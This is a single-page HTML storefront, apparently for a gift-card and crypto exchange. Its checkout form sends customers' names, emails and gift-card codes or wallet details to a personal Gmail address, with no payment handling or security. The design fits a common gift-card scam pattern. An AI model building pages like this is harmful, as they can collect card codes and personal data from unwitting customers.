<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Apex Exchange - Gift Cards & Crypto</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://formspree.io/js/formbutton-v1.min.js" defer></script>
</head>
<body class="bg-slate-950 text-slate-100 font-sans min-h-screen">

  <!-- Header -->
  <header class="border-b border-slate-800 bg-slate-900/80 sticky top-0 z-40 backdrop-blur-md">
    <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
      <div class="flex items-center gap-2">
        <div class="w-10 h-10 rounded-xl bg-emerald-500 flex items-center justify-center font-bold text-slate-950 text-xl">⚡</div>
        <span class="text-xl font-bold tracking-wide">Apex<span class="text-emerald-400">Exchange</span></span>
      </div>
      
      <div class="flex items-center gap-4">
        <select id="modeToggle" onchange="filterItems()" class="bg-slate-800 text-sm font-medium px-3 py-2 rounded-lg border border-slate-700 focus:outline-none focus:border-emerald-500">
          <option value="buy">Mode: Buy Assets</option>
          <option value="sell">Mode: Sell to Us</option>
        </select>
        
        <button onclick="toggleCart()" class="relative bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-semibold px-4 py-2 rounded-lg transition flex items-center gap-2">
          <span>🛒 Cart</span>
          <span id="cartBadge" class="bg-slate-950 text-emerald-400 text-xs px-2 py-0.5 rounded-full hidden">0</span>
        </button>
      </div>
    </div>
  </header>

  <!-- Main Section -->
  <main class="max-w-7xl mx-auto px-4 py-8">
    <div class="mb-8 flex flex-col md:flex-row justify-between items-center gap-4">
      <div>
        <h1 class="text-3xl font-extrabold">Instant Gift Card & Crypto Trading</h1>
        <p class="text-slate-400 text-sm mt-1">Select your asset, enter details, and execute trades in seconds.</p>
      </div>
      
      <!-- Category Tabs -->
      <div class="flex gap-2 bg-slate-900 p-1.5 rounded-xl border border-slate-800">
        <button onclick="setCategory('all')" id="tab-all" class="px-4 py-1.5 text-sm font-medium rounded-lg bg-emerald-500 text-slate-950">All</button>
        <button onclick="setCategory('giftcard')" id="tab-giftcard" class="px-4 py-1.5 text-sm font-medium rounded-lg text-slate-400 hover:text-white">Gift Cards</button>
        <button onclick="setCategory('crypto')" id="tab-crypto" class="px-4 py-1.5 text-sm font-medium rounded-lg text-slate-400 hover:text-white">Crypto</button>
      </div>
    </div>

    <!-- Product Grid -->
    <div id="productGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"></div>
  </main>

  <!-- Cart Modal -->
  <div id="cartModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 hidden flex justify-end">
    <div class="bg-slate-900 w-full max-w-md h-full p-6 flex flex-col border-l border-slate-800">
      <div class="flex justify-between items-center pb-4 border-b border-slate-800">
        <h2 class="text-xl font-bold">Your Order Cart</h2>
        <button onclick="toggleCart()" class="text-slate-400 hover:text-white text-xl">&times;</button>
      </div>

      <div id="cartItems" class="flex-1 overflow-y-auto py-4 space-y-4"></div>

      <div class="border-t border-slate-800 pt-4">
        <div class="flex justify-between font-bold text-lg mb-4">
          <span>Total:</span>
          <span id="cartTotal" class="text-emerald-400">$0.00</span>
        </div>

        <!-- Order Form routing to email -->
        <form id="orderForm" action="https://formspree.io/f/holamieazy@gmail.com" method="POST" onsubmit="handleCheckout(event)" class="space-y-3">
          <input type="hidden" name="_replyto" value="holamieazy@gmail.com">
          <input type="hidden" name="Order_Details" id="hiddenOrderDetails">
          
          <input type="text" name="Customer_Name" placeholder="Your Full Name" required class="w-full bg-slate-800 text-sm px-3 py-2 rounded border border-slate-700 focus:outline-none focus:border-emerald-500">
          <input type="email" name="Customer_Email" placeholder="Your Email Address" required class="w-full bg-slate-800 text-sm px-3 py-2 rounded border border-slate-700 focus:outline-none focus:border-emerald-500">
          <input type="text" name="Account_or_Wallet" placeholder="Wallet Address / Card Code Details" required class="w-full bg-slate-800 text-sm px-3 py-2 rounded border border-slate-700 focus:outline-none focus:border-emerald-500">

          <button type="submit" class="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold py-3 rounded-lg transition">
            Submit & Notify Admin (`holamieazy@gmail.com`)
          </button>
        </form>
      </div>
    </div>
  </div>

  <script>
    const products = [
      { id: 1, name: 'Amazon Gift Card', category: 'giftcard', price: 100, icon: '📦' },
      { id: 2, name: 'Apple / iTunes', category: 'giftcard', price: 50, icon: '🍎' },
      { id: 3, name: 'Steam Wallet', category: 'giftcard', price: 50, icon: '🎮' },
      { id: 4, name: 'Sephora Card', category: 'giftcard', price: 100, icon: '💄' },
      { id: 5, name: 'Bitcoin (BTC)', category: 'crypto', price: 64000, icon: '₿' },
      { id: 6, name: 'Ethereum (ETH)', category: 'crypto', price: 3400, icon: 'Ξ' },
      { id: 7, name: 'Tether (USDT)', category: 'crypto', price: 1, icon: '₮' },
      { id: 8, name: 'Solana (SOL)', category: 'crypto', price: 150, icon: '◎' },
    ];

    let cart = [];
    let currentCategory = 'all';

    function renderProducts() {
      const grid = document.getElementById('productGrid');
      const mode = document.getElementById('modeToggle').value;
      grid.innerHTML = '';

      const filtered = products.filter(p => currentCategory === 'all' || p.category === currentCategory);

      filtered.forEach(p => {
        const card = document.createElement('div');
        card.className = 'bg-slate-900 border border-slate-800 rounded-2xl p-5 flex flex-col justify-between hover:border-slate-700 transition';
        card.innerHTML = `
          <div>
            <div class="text-4xl mb-3">${p.icon}</div>
            <h3 class="font-bold text-lg">${p.name}</h3>
            <p class="text-slate-400 text-xs uppercase tracking-wider mt-1">${p.category}</p>
          </div>
          <div class="mt-6 flex items-center justify-between">
            <span class="text-emerald-400 font-bold">$${p.price.toLocaleString()}</span>
            <button onclick="addToCart(${p.id})" class="bg-slate-800 hover:bg-emerald-500 hover:text-slate-950 text-white font-medium text-xs px-3 py-2 rounded-lg transition">
              ${mode === 'buy' ? '+ Add to Buy' : '+ Add to Sell'}
            </button>
          </div>
        `;
        grid.appendChild(card);
      });
    }

    function setCategory(cat) {
      currentCategory = cat;
      ['all', 'giftcard', 'crypto'].forEach(c => {
        const btn = document.getElementById(`tab-${c}`);
        if(c === cat) {
          btn.className = 'px-4 py-1.5 text-sm font-medium rounded-lg bg-emerald-500 text-slate-950';
        } else {
          btn.className = 'px-4 py-1.5 text-sm font-medium rounded-lg text-slate-400 hover:text-white';
        }
      });
      renderProducts();
    }

    function addToCart(id) {
      const item = products.find(p => p.id === id);
      cart.push(item);
      updateCartUI();
    }

    function updateCartUI() {
      const badge = document.getElementById('cartBadge');
      const cartItems = document.getElementById('cartItems');
      const totalEl = document.getElementById('cartTotal');

      if (cart.length > 0) {
        badge.textContent = cart.length;
        badge.classList.remove('hidden');
      } else {
        badge.classList.add('hidden');
      }

      cartItems.innerHTML = cart.map((item, index) => `
        <div class="flex items-center justify-between bg-slate-800/50 p-3 rounded-lg">
          <div>
            <div class="font-bold text-sm">${item.name}</div>
            <div class="text-emerald-400 text-xs">$${item.price}</div>
          </div>
          <button onclick="removeFromCart(${index})" class="text-red-400 hover:text-red-300 text-xs">Remove</button>
        </div>
      `).join('');

      const total = cart.reduce((sum, item) => sum + item.price, 0);
      totalEl.textContent = `$${total.toLocaleString()}`;
      document.getElementById('hiddenOrderDetails').value = JSON.stringify(cart);
    }

    function removeFromCart(index) {
      cart.splice(index, 1);
      updateCartUI();
    }

    function toggleCart() {
      document.getElementById('cartModal').classList.toggle('hidden');
    }

    function filterItems() {
      renderProducts();
    }

    function handleCheckout(e) {
      if(cart.length === 0) {
        e.preventDefault();
        alert('Please add items to your cart before checking out!');
        return false;
      }
      alert('Order Submitted! A notification has been dispatched to holamieazy@gmail.com.');
    }

    renderProducts();
  </script>
</body>
</html>
